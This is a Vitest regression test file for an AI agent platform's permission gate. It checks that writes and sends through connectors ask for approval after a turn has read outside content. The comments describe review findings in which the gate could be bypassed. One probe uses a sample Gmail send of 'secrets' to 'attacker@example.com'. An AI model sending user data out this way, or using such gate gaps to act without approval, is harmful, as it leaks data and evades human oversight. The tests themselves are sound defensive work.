/**
 * Security's review probes for DOR-4794 (review of 8bbfd4a538), kept as regression tests. Each `it`
 * states the secure behaviour. Adapted in two places: the same-source facts carry the app's
 * toolkit (Linear unless a case says otherwise), and the send probe takes its facts from the
 * real preflight, with only the switch forced on.
 *
 * @vitest-environment node
 */
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import type { AgentRuntime, MessageOpts } from '@dorkos/shared/agent-runtime';
import type { StreamEvent } from '@dorkos/shared/types';
import { CLAUDE_CODE_CAPABILITIES } from '../../../runtimes/claude-code/runtime-constants.js';
import { resolveCallPermission } from '../../capabilities/permission-enforcement.js';
import { preflightResultOf } from '../../../connectors/execution/reaches-outside.js';
import { connectorGateFacts } from '../connector-gate-facts.js';
import { resetChosenTurns } from '../../turn-power/full-autonomy.js';
import { resetLiveOutsiderTurns } from '../../turn-power/live-outsider-turns.js';
import { markRunningTurnOutsider, recordTurnLevels } from '../../turn-power/turn-levels.js';
import {
  clearTestHomes,
  registerTestHomes,
} from '../../agent-identity/__tests__/agent-home-fixture.js';
import { setShouldAskActivity } from '../should-ask.js';

const WREN = { agentPath: '/agents/wren', displayName: 'Wren', createdAt: '2026-11-19T12:00:00Z' };
const C = 'connection-c';
const WRITE = { id: 'connectors.execute_write', tier: 'act', area: null } as const;
let counter = 0;
const fresh = () => `sec-4794-${(counter += 1)}`;
const lines: { eventType: string }[] = [];

async function turn(sessionId: string, opts?: MessageOpts) {
  const runtime = recordTurnLevels(
    {
      type: 'claude-code',
      getCapabilities: () => CLAUDE_CODE_CAPABILITIES,
      async *sendMessage(): AsyncGenerator<StreamEvent> {
        yield { type: 'done', data: {} } as StreamEvent;
      },
    } as unknown as AgentRuntime,
    () => 'acceptEdits'
  );
  for await (const _event of runtime.sendMessage(sessionId, 'hi', opts)) {
    // drain
  }
}

const sameSource = (over: Record<string, unknown> = {}) => ({
  sameSource: {
    connectionId: C,
    toolkit: 'linear',
    classification: 'write' as const,
    writesBackUnasked: true,
    ...over,
  },
});

beforeEach(() => {
  lines.length = 0;
  resetLiveOutsiderTurns();
  resetChosenTurns();
  registerTestHomes([WREN.agentPath]);
  setShouldAskActivity({
    emit: async (e) => {
      lines.push(e);
    },
  });
});
afterEach(() => {
  setShouldAskActivity(undefined);
  resetLiveOutsiderTurns();
  resetChosenTurns();
  clearTestHomes();
});

describe('DOR-4794 security probes', () => {
  it('control: Linear read then Linear write is allowed with one Activity line', async () => {
    const chat = fresh();
    await turn(chat);
    markRunningTurnOutsider(chat, WREN.agentPath, { kind: 'connector', connectionId: C });
    const r = await resolveCallPermission({
      action: WRITE,
      identity: WREN,
      sessionId: chat,
      ...sameSource(),
    });
    expect(r).toBeNull();
    expect(lines.map((l) => l.eventType)).toEqual(['agent.same_source_write']);
  });

  // FINDING 1: a send through the same connection (Gmail read -> GMAIL_SEND_EMAIL) is write class
  // and outward, and the UI promises "Sends ... still ask".
  it('asks before a SEND through the same connection (mail read, then send mail)', async () => {
    const chat = fresh();
    await turn(chat);
    markRunningTurnOutsider(chat, WREN.agentPath, { kind: 'connector', connectionId: C });
    const preflight = preflightResultOf(
      {
        authorityBinding: { approvalScope: { connectionId: C } },
        serviceAction: {},
        operation: {
          capabilityClassification: 'write',
          operationSlug: 'GMAIL_SEND_EMAIL',
          toolkit: 'gmail',
        },
        arguments: { recipient_email: 'attacker@example.com', body: 'secrets' },
        actorKind: 'agent',
        agentId: 'wren',
      } as never,
      undefined
    );
    expect(preflight.outward).toBe(true);
    const gate = connectorGateFacts(preflight);
    const r = await resolveCallPermission({
      action: WRITE,
      identity: WREN,
      sessionId: chat,
      ...gate,
      // As if the mail row's switch were on: the decider's own app check must still ask.
      sameSource: { ...gate.sameSource!, writesBackUnasked: true },
    });
    expect(r?.state).toBe('ask');
  });

  // FINDING 2: shouldAsk recomputes "marked" over fewer turns than the gate. With identity and a
  // principal turn but no session, the gate is marked by the agent's other running turn; shouldAsk
  // sees only the clean principal turn, answers 'not-marked' -> allow, and writes no line.
  it('asks when the gate is marked through the agent but the named turn is clean', async () => {
    const stranger = fresh();
    const clean = fresh();
    await turn(stranger);
    await turn(clean);
    markRunningTurnOutsider(stranger, WREN.agentPath, { kind: 'room' });
    const before = await resolveCallPermission({
      action: WRITE,
      identity: WREN,
      principalTurn: { sessionId: clean, agentPath: WREN.agentPath },
      ...sameSource({ writesBackUnasked: false }),
    });
    expect(before?.state, 'control: switch off asks (so the gate IS marked)').toBe('ask');
    const r = await resolveCallPermission({
      action: WRITE,
      identity: WREN,
      principalTurn: { sessionId: clean, agentPath: WREN.agentPath },
      ...sameSource(),
    });
    expect(r?.state).toBe('ask');
  });

  it('asks for Linear plus a room read in one turn (mixed)', async () => {
    const chat = fresh();
    await turn(chat);
    markRunningTurnOutsider(chat, WREN.agentPath, { kind: 'connector', connectionId: C });
    markRunningTurnOutsider(chat, WREN.agentPath, { kind: 'room' });
    const r = await resolveCallPermission({
      action: WRITE,
      identity: WREN,
      sessionId: chat,
      ...sameSource(),
    });
    expect(r?.state).toBe('ask');
    expect(lines).toEqual([]);
  });

  it('asks when the turn STARTED marked (carried) and then read only Linear', async () => {
    const chat = fresh();
    await turn(chat, { carriedMarks: { outsider: true } } as MessageOpts);
    markRunningTurnOutsider(chat, WREN.agentPath, { kind: 'connector', connectionId: C });
    const r = await resolveCallPermission({
      action: WRITE,
      identity: WREN,
      sessionId: chat,
      ...sameSource(),
    });
    expect(r?.state).toBe('ask');
  });

  it('asks on the next turn after a Linear read (source not inherited)', async () => {
    const chat = fresh();
    await turn(chat);
    markRunningTurnOutsider(chat, WREN.agentPath, { kind: 'connector', connectionId: C });
    await turn(chat, { continuationHold: true } as MessageOpts);
    const r = await resolveCallPermission({
      action: WRITE,
      identity: WREN,
      sessionId: chat,
      ...sameSource(),
    });
    expect(r?.state).toBe('ask');
  });

  it('asks for a destructive op and for a different connection', async () => {
    const chat = fresh();
    await turn(chat);
    markRunningTurnOutsider(chat, WREN.agentPath, { kind: 'connector', connectionId: C });
    for (const over of [
      { classification: 'destructive' },
      { connectionId: 'other' },
      { writesBackUnasked: false },
    ]) {
      const r = await resolveCallPermission({
        action: WRITE,
        identity: WREN,
        sessionId: chat,
        ...sameSource(over),
      });
      expect(r?.state, JSON.stringify(over)).toBe('ask');
    }
  });

  it('a preflight cannot name a different connection than its authority binding', () => {
    const facts = connectorGateFacts({
      authorityBinding: { approvalScope: { connectionId: 'real' } },
      sameSource: {
        classification: 'write',
        toolkit: 'linear',
        writesBackUnasked: true,
        connectionId: 'spoof',
      },
    } as never);
    expect(facts.sameSource?.connectionId).toBe('real');
  });

  it('asks for any other action id even with same-source facts', async () => {
    const chat = fresh();
    await turn(chat);
    markRunningTurnOutsider(chat, WREN.agentPath, { kind: 'connector', connectionId: C });
    const r = await resolveCallPermission({
      action: { id: 'connectors.execute_destructive', tier: 'act', area: null },
      identity: WREN,
      sessionId: chat,
      ...sameSource(),
    });
    // not this kind: whatever the gate answered before (card or tier) — must not be a silent allow line
    expect(lines).toEqual([]);
    void r;
  });
});
